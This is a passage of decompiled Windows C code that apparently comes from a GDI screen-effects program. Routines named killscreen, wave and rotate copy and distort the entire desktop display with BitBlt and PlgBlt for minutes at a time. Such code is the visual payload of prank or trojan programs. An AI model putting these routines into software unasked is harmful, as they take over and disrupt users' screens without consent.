    int cy; // [rsp+64h] [rbp-Ch]
    HDC hdc; // [rsp+68h] [rbp-8h]

    hdc = GetDC(0i64);
    cy = GetSystemMetrics(1);
    v1 = GetSystemMetrics(0);
    y1 = rand() % cy;
    rand();
    BitBlt(hdc, 0, 0, v1, cy, hdc, 0, y1, 0x8800C6u);
    Sleep(0x1F4u);
}

VOID WINAPI killscreen(LPVOID lpThreadParameter)
{
    int v1; // [rsp+58h] [rbp-28h]
    int y; // [rsp+5Ch] [rbp-24h]
    int v3; // [rsp+60h] [rbp-20h]
    int v4; // [rsp+64h] [rbp-1Ch]
    time_t v5; // [rsp+68h] [rbp-18h]
    HDC hdc; // [rsp+78h] [rbp-8h]

    hdc = GetDC(0i64);
    v5 = time(0i64);
    while (time(0i64) - v5 < 120)
    {
        v4 = GetSystemMetrics(0);
        v3 = GetSystemMetrics(1);
        y = rand() % v3;
        v1 = rand() % 5;
        if (v1)
        {
            if (v1 == 1)
                BitBlt(hdc, 0, y, v4, 15, hdc, 1, y, 0xCC0020u);
        }
        else
        {
            BitBlt(hdc, 1, y, v4, 15, hdc, 0, y, 0xCC0020u);
        }
    }
    ExitThread(0);
}

__int64 Right1()
{
    HWND v0; // rax
    __int64 result; // rax
    POINT Point; // [rsp+50h] [rbp-50h] BYREF
    int v3; // [rsp+58h] [rbp-48h]
    int v4; // [rsp+5Ch] [rbp-44h]
    int v5; // [rsp+60h] [rbp-40h]
    int v6; // [rsp+64h] [rbp-3Ch]
    struct tagRECT Rect; // [rsp+70h] [rbp-30h] BYREF
    time_t v8; // [rsp+80h] [rbp-20h]
    __int64 v9; // [rsp+88h] [rbp-18h]
    int v10; // [rsp+94h] [rbp-Ch]
    HDC hdcDest; // [rsp+98h] [rbp-8h]

    hdcDest = GetDC(0i64);
    v10 = 10;
    v9 = 5i64;
    v8 = time(0i64);
    while (1)
    {
        result = time(0i64) - v8;
        if (result >= v9)
            break;
        v0 = GetDesktopWindow();
        GetWindowRect(v0, &Rect);
        Point.x = Rect.left - v10;
        Point.y = Rect.top + v10;
        v3 = Rect.right - v10;
        v4 = Rect.top - v10;
        v5 = Rect.left + v10;
        v6 = Rect.bottom + v10;
        PlgBlt(hdcDest, &Point, hdcDest, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
    }
    return 0;
}

__int64 Left1()
{
    HWND v0; // rax
    __int64 result; // rax
    POINT Point; // [rsp+50h] [rbp-50h] BYREF
    int v3; // [rsp+58h] [rbp-48h]
    int v4; // [rsp+5Ch] [rbp-44h]
    int v5; // [rsp+60h] [rbp-40h]
    int v6; // [rsp+64h] [rbp-3Ch]
    struct tagRECT Rect; // [rsp+70h] [rbp-30h] BYREF
    time_t v8; // [rsp+80h] [rbp-20h]
    __int64 v9; // [rsp+88h] [rbp-18h]
    int v10; // [rsp+94h] [rbp-Ch]
    HDC hdcDest; // [rsp+98h] [rbp-8h]

    hdcDest = GetDC(0i64);
    v10 = 10;
    v9 = 5i64;
    v8 = time(0i64);
    while (1)
    {
        result = time(0i64) - v8;
        if (result >= v9)
            break;
        v0 = GetDesktopWindow();
        GetWindowRect(v0, &Rect);
        Point.x = Rect.left + v10;
        Point.y = Rect.top - v10;
        v3 = Rect.right + v10;
        v4 = Rect.top + v10;
        v5 = Rect.left - v10;
        v6 = Rect.bottom - v10;
        PlgBlt(hdcDest, &Point, hdcDest, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
    }
    return 0;
}

__int64 w4()
{
    __int64 result; // rax
    int y; // [rsp+5Ch] [rbp-24h]
    int v2; // [rsp+60h] [rbp-20h]
    int v3; // [rsp+64h] [rbp-1Ch]
    time_t v4; // [rsp+68h] [rbp-18h]
    HDC hdc; // [rsp+78h] [rbp-8h]

    hdc = GetDC(0i64);
    v4 = time(0i64);
    while (1)
    {
        result = time(0i64) - v4;
        if (result >= 15)
            break;
        v3 = GetSystemMetrics(1);
        v2 = GetSystemMetrics(0);
        y = rand() % v3;
        rand();
        BitBlt(hdc, 0, y, v2, 15, hdc, 1, y, 0xCC0020u);
    }
    return 0;
}

__int64 w3()
{
    __int64 result; // rax
    int y; // [rsp+5Ch] [rbp-24h]
    int v2; // [rsp+60h] [rbp-20h]
    int v3; // [rsp+64h] [rbp-1Ch]
    time_t v4; // [rsp+68h] [rbp-18h]
    HDC hdc; // [rsp+78h] [rbp-8h]

    hdc = GetDC(0i64);
    v4 = time(0i64);
    while (1)
    {
        result = time(0i64) - v4;
        if (result >= 10)
            break;
        v3 = GetSystemMetrics(1);
        v2 = GetSystemMetrics(0);
        y = rand() % v3;
        rand();
        BitBlt(hdc, 0, y, v2, 15, hdc, 1, y, 0x8800C6u);
    }
    return 0;
}

__int64 w2()
{
    __int64 result; // rax
    int y; // [rsp+5Ch] [rbp-24h]
    int v2; // [rsp+60h] [rbp-20h]
    int v3; // [rsp+64h] [rbp-1Ch]
    time_t v4; // [rsp+68h] [rbp-18h]
    HDC hdc; // [rsp+78h] [rbp-8h]

    hdc = GetDC(0i64);
    v4 = time(0i64);
    while (1)
    {
        result = time(0i64) - v4;
        if (result >= 10)
            break;
        v3 = GetSystemMetrics(1);
        v2 = GetSystemMetrics(0);
        y = rand() % v3;
        rand();
        BitBlt(hdc, 0, y, v2, 15, hdc, 1, y, 0x660046u);
    }
    return 0;
}

__int64 w1()
{
    __int64 result; // rax
    int y; // [rsp+5Ch] [rbp-24h]
    int v2; // [rsp+60h] [rbp-20h]
    int v3; // [rsp+64h] [rbp-1Ch]
    time_t v4; // [rsp+68h] [rbp-18h]
    HDC hdc; // [rsp+78h] [rbp-8h]

    hdc = GetDC(0i64);
    v4 = time(0i64);
    while (1)
    {
        result = time(0i64) - v4;
        if (result >= 10)
            break;
        v3 = GetSystemMetrics(1);
        v2 = GetSystemMetrics(0);
        y = rand() % v3;
        rand();
        BitBlt(hdc, 0, y, v2, 15, hdc, 1, y, 0xEE0086u);
    }
    return 0;
}

DWORD WINAPI rotate(LPVOID)
{
    __int64 v3; // rax
    time_t v5; // [rsp+38h] [rbp-38h]
    time_t v6; // [rsp+48h] [rbp-28h]
    HANDLE hObject; // [rsp+58h] [rbp-18h]
    time_t v8; // [rsp+60h] [rbp-10h]
    v8 = time(0i64);
    while (time(0i64) - v8 < 180)
    {
        w1();
        w2();
        w3();
        w4();
    }
    hObject = CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)killscreen, 0i64, 0, 0i64);
    v6 = time(0i64);
    while (time(0i64) - v6 < 120)
    {
        Left1();
        Right1();
    }
    CloseHandle(hObject);
    v5 = time(0i64);
    while (1)
    {
        v3 = time(0i64) - v5;
        if (v3 >= 120)
            break;
        TaskDesk();
    }
    return 0;
}

DWORD WINAPI wave(LPVOID)
{
    int v4; // [rsp+58h] [rbp-18h]
    int y; // [rsp+5Ch] [rbp-14h]
    int v6; // [rsp+60h] [rbp-10h]
    int v7; // [rsp+64h] [rbp-Ch]
    HDC hdc; // [rsp+68h] [rbp-8h]
    hdc = GetDC(0i64);
    while (1)
    {
        v7 = GetSystemMetrics(1);
        v6 = GetSystemMetrics(0);
        y = rand() % v7;
        v4 = rand() % 5;
        if (v4)
        {
            if (v4 == 1)
                BitBlt(hdc, 0, y, v6, 15, hdc, 1, y, 0xCC0020u);
        }
        else
        {
            BitBlt(hdc, 1, y, v6, 15, hdc, 0, y, 0xCC0020u);
        }
    }
}